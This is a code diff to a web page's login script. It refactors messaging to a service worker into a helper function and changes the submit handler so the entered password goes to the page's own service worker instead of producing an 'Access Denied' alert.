@@ -129,6 +129,16 @@
     navigator.serviceWorker.addEventListener('message', e => {
       console.log('Message from Service Worker:', e.data);
     });
+
+    function message(msg) {
+      if (navigator.serviceWorker.controller) {
+        navigator.serviceWorker.controller.postMessage(msg);
+      } else {
+        navigator.serviceWorker.ready.then(sw => {
+          sw.active.postMessage(msg);
+        });
+      }
+    }
     
     function registerServiceWorker() {
       if ("serviceWorker" in navigator) {
@@ -136,13 +146,7 @@
           navigator.serviceWorker.register(
             "backend.js"
           ).then(reg => {
-            if (navigator.serviceWorker.controller) {
-              navigator.serviceWorker.controller.postMessage({ });
-            } else {
-              navigator.serviceWorker.ready.then(sw => {
-                sw.active.postMessage({ });
-              });
-            }
+            message({ });
             console.log(
               "Service Worker registered with scope:",
               reg.scope
@@ -153,8 +157,6 @@
         }
       }
     }
-
-    registerServiceWorker();
     
     const passwordInput = document.getElementById('password');
     const eyeToggle = document.querySelector('.eye-toggle');
@@ -175,9 +177,8 @@
 
     form.addEventListener('submit', (e) => {
       e.preventDefault();
-      alert('Access Denied');
-      passwordInput.value = '';
-      passwordInput.focus();
+
+      message({ pass: passwordInput.value });
     });
 
     passwordInput.addEventListener('keydown', (e) => {
@@ -185,6 +186,8 @@
         form.requestSubmit();
       }
     });
+    
+    registerServiceWorker();
   </script>
 </body>
 </html>
